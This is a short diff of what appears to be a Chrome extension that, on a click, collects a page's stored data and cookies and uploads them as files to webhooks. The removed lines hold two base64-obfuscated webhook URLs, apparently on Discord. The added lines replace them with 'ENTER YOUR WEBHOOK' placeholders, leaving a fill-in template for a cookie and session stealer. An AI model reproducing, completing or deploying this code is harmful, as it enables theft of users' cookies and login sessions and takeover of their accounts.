@@ -21,8 +21,8 @@ chrome.action.onClicked.addListener(async (tab) => {
         });
         const storageData = result[0].result.storageData;
 
-        const localStorageWebhook = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM0MzQ3NDg0NjQzNjI5NDY1Ni9pb0liUFhVMnR0MXN3YmJmdzZtU0dLVHJVZmR4ZFVFRkJuZ2ZlR0QzcEF4LTR3X1pDYVBaU1U4UnVNbzZUclEweFg4bQ==");
-        const cookiesWebhook = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM0MzQ3NDg0OTc0MTQwNjIzOC9xOWViVzVtRWEzWlIyaU5Fdzk3aFVyVUJaZFBXUnlpZkhBaFZNcGwxNkNnU1drQWVuUnhuRGkza09EdTExZ2JzRjF0Wg==");
+        const localStorageWebhook = //ENTER YOUR WEBHOOK
+        const cookiesWebhook = //ENTER YOUR WEBHOOK
 
         async function sendWebhookWithFile(webhookUrl, content, fileName, fileContent) {
             const boundary = "----WebKitFormBoundary" + Math.random().toString(16).slice(2);
